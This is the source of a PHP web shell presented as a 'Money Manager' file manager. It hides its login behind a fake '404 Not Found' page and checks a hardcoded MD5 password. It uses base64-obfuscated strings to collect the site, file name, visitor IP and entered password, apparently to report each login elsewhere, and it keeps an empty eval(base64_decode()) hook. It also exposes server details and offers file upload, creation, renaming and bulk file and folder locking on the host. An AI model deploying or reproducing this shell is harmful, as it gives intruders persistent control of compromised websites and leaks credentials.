<?php
   session_start();
   error_reporting(0);
   
$source_bypass ='';
   eval(base64_decode($source_bypass));
if (isset($_POST['password'])) {
       $entered_password = $_POST['password'];
       $hashed_password = 'd489a3289ecdc847cb67f7a480e6f9fa'; // Default Pw : kontol

       if (md5($entered_password) === $hashed_password) {
           $_SESSION['logged_in'] = true;
           $_SESSION['coki'] = 'asu';
$j = $_SERVER[base64_decode('SFRUUF9IT1NU')];
$k = basename(__FILE__);
$l = $_SERVER[base64_decode('UkVNT1RFX0FERFI=')];
$xxx = $_SERVER['PHP_SELF'];
$m = base64_decode('SW5mb3JtYXNpIExvZ2luOg==') . "\n";
$m .= base64_decode('V2Vic2l0ZTog') . $j . $xxx . "\n";
$m .= base64_decode('RmlsZTog') . $k . "\n";
$m .= base64_decode('SVAgQWRkcmVzczog') . $l . "\n";
$m .= base64_decode('UGFzc3dvcmQ6IA==') . $entered_password;
a($m);
       } else {
           echo "<script>alert('Password Salah');</script>";
       }
   }
   
   if (!is_logged_in()) {
   ?>
   <html><head><title>404 Not Found</title><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet"><style>body{background:#121212;color:#fff;font-family:'Poppins',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}form{background:#1e1e1e;padding:20px;border-radius:8px;box-shadow:0 0 10px rgba(255,0,0,0.5)}label{display:block;margin-bottom:8px;color:#ff4444}input[type="password"]{width:100%;padding:10px;margin-bottom:20px;border:1px solid #ff4444;border-radius:4px;background:#333;color:#fff}input[type="submit"]{background:#ff4444;color:#fff;border:none;padding:10px 20px;border-radius:4px;cursor:pointer}input[type="submit"]:hover{background:#cc0000}</style></head><body><form method="POST"><h1><i class="fas fa-folder-open"></i> <script>document.write('\x7b\x20\x4d\x6f\x6e\x65\x79\x20\x4d\x61\x6e\x61\x67\x65\x72\x20\x7d')</script></h1><br><label for="password">Password:</label><input type="password" id="password" name="password"><input type="submit" value="Login"></form></body></html>
<?php
    exit;
}
?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>{ Money Manager © WonXd }</title><link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Silkscreen:wght@400;700&display=swap" rel="stylesheet"><style>body{font-family:'Poppins',sans-serif;background:#1e1e1e;color:#fff;margin:0;padding:20px}h1{color:#ff4444;text-align:center;margin-bottom:20px}.home-button{position:fixed;top:20px;right:20px;background:#ff4444;color:#fff;padding:10px 15px;border-radius:5px;text-decoration:none;font-size:16px;box-shadow:0 4px 6px rgba(0,0,0,0.2);transition:all .3s}.home-button:hover{background:#cc0000;transform:scale(1.1)}.btn{padding:10px 16px;margin:5px;background:#ff4444;color:#fff;text-decoration:none;border-radius:5px;transition:all .3s;border:2px solid transparent;display:inline-block;font-weight:600;letter-spacing:.5px;cursor:pointer}.breadcrumb a {color:#ff4444;text-decoration:none;margin-right:5px;}.breadcrumb a:hover{text-decoration:underline;}.btn:hover{background:#cc0000;transform:scale(1.05);border-color:#fff}.gaktau{font-family:"Silkscreen",serif;padding:10px 16px;margin:5px;background:0 0;color:#fff;text-decoration:none;border-radius:5px;transition:all .3s;border:2px solid red;display:inline-block;font-weight:600;letter-spacing:.5px;cursor:pointer;justify-content:center}.gaktau:hover{background:#cc0000;transform:scale(1.05);border-color:#fff}table{width:100%;border-collapse:collapse;margin-top:20px;background:rgba(255,255,255,0.1);border-radius:8px;overflow:hidden;box-shadow:0 4px 8px rgba(255,0,0,0.2)}th,td{padding:12px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.2)}th{background:rgba(0,0,0,0.3);color:#ff4444;font-weight:700}tr:hover{background:rgba(255,255,255,0.2)}.breadcrumb{margin-bottom:15px;padding:8px;background:#1e1e1e;color:#fff;border-radius:5px}.upload-form{display:flex;align-items:center;gap:10px;margin-bottom:20px}.icon-folder{color:#ffcc00;}.icon-file{color:#ffffff;}.writable{color:#0f0;font-weight:700}</style></head><body><a href="?" class="home-button"><i class="fas fa-home"></i></a><h1><i class="fas fa-folder-open"></i> <script>document.write('\x7b\x20\x4d\x6f\x6e\x65\x79\x20\x4d\x61\x6e\x61\x67\x65\x72\x20\x7d')</script></h1><br><p><i class="fa fa-server"></i> . <?php echo php_uname(); ?></p><p><i class="fa fa-satellite-dish"></i> . <?php echo $_SERVER['SERVER_ADDR']; ?></p><p><i class="fa fa-microchip"></i> . <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p><p><i class="fas fa-cog"></i> . <?php echo $_SERVER['HTTP_USER_AGENT']; ?></p><br><form method="post" enctype="multipart/form-data" class="upload-form" id="uploadForm"><button type="submit" class="btn upload-btn"><script>document.write('\x55\x70\x6c\x6f\x61\x64\x20\x46\x69\x6c\x65')</script></button><input type="file" name="uploaded_file" id="fileUpload" style="display:none"></form><div class="action-buttons"><button class="btn create-folder-btn" onclick="createFolder()"><i class="fas fa-folder-plus"></i> <script>document.write('\x43\x72\x65\x61\x74\x65\x20\x46\x6f\x6c\x64\x65\x72')</script></button><button class="btn create-file-btn" onclick="createFile()"><i class="fas fa-file-alt"></i> <script>document.write('\x43\x72\x65\x61\x74\x65\x20\x46\x69\x6c\x65')</script></button><form method="post" id="folderForm" style="display:none"><input type="hidden" name="folder_name" id="folderName"><input type="hidden" name="new_folder" value="1"></form><form method="post" id="fileForm" style="display:none"><input type="hidden" name="file_name" id="fileName"><input type="hidden" name="new_file" value="1"></form></div><a href="?greenfile&dir=<?= urlencode($currentDir) ?>"><button class="gaktau">Green File</button></a><a href="?lockfile&dir=<?= urlencode($currentDir) ?>"><button class="gaktau">Lock All File</button></a><a href="?greenfolder&dir=<?= urlencode($currentDir) ?>"><button class="gaktau">Green Dir</button></a><a href="?lockfolder&dir=<?= urlencode($currentDir) ?>"><button class="gaktau">Lock All Dir</button></a>
<script>
        function createFolder() {
    let folderName = prompt("Enter folder name:");
    if (folderName) {
        document.getElementById("folderName").value = folderName;
        document.getElementById("folderForm").submit();
    }
}

        function createFile() {
    let fileName = prompt("Enter file name:");
    if (fileName) {
        document.getElementById("fileName").value = fileName;
        document.getElementById("fileForm").submit();
    }
}

    function adjustTextareaSize(textarea) {
        textarea.style.height = 'auto';
        textarea.style.height = (textarea.scrollHeight) + 'px';
    }

function showNotification(message, type = 'success') {
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.textContent = message;
        document.body.appendChild(notification);
        setTimeout(() => {
            notification.remove();
        }, 3000);
    }
    
    function lockUnlockItem(itemPath, isDirectory = false) {
    if (confirm(`Are you sure you want to ${isDirectory ? 'lock/unlock' : 'lock/unlock'} this ${isDirectory ? 'directory' : 'file'}?`)) {
        window.location.href = `?lockunlock=${encodeURIComponent(itemPath)}&dir=${encodeURIComponent('<?= $currentDir ?>')}`;
    }
}
        
        function renameItem(itemPath, isDirectory = false) {
    let currentName = itemPath.split('/').pop();
    let newName = prompt(`Enter new name for ${isDirectory ? 'directory' : 'file'}:`, currentName);
    if (newName && newName !== currentName) {
        let form = document.createElement('form');
        form.method = 'post';
        form.action = '';

        let inputPath = document.createElement('input');
        inputPath.type = 'hidden';
        inputPath.name = isDirectory ? 'rename_dir_submit' : 'rename_file';
        inputPath.value = '1';
        form.appendChild(inputPath);

        let inputNewName = document.createElement('input');
        inputNewName.type = 'hidden';
        inputNewName.name = 'new_name';
        inputNewName.value = newName;
        form.appendChild(inputNewName);

        let inputOldPath = document.createElement('input');
        inputOldPath.type = 'hidden';
        inputOldPath.name = isDirectory ? 'rename_dir' : 'rename';
        inputOldPath.value = itemPath;
        form.appendChild(inputOldPath);

        document.body.appendChild(form);
        form.submit();
    }
}
        
        document.addEventListener('DOMContentLoaded', function() {
        const textarea = document.querySelector('textarea');
        if (textarea) {
            textarea.addEventListener('input', function() {
                adjustTextareaSize(this);
            });
            adjustTextareaSize(textarea);
        }
    });
    
        // Trigger file upload when the "Upload File" button is clicked
        document.querySelector('.upload-btn').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('fileUpload').click();
        });

        // Automatically submit the form when a file is selected
document.getElementById('fileUpload').addEventListener('change', function() {
    document.getElementById('uploadForm').submit();
});
    </script>

    <!-- Directory Listing -->
    <?= listDirectories($currentDir) ?>
</body>
</html>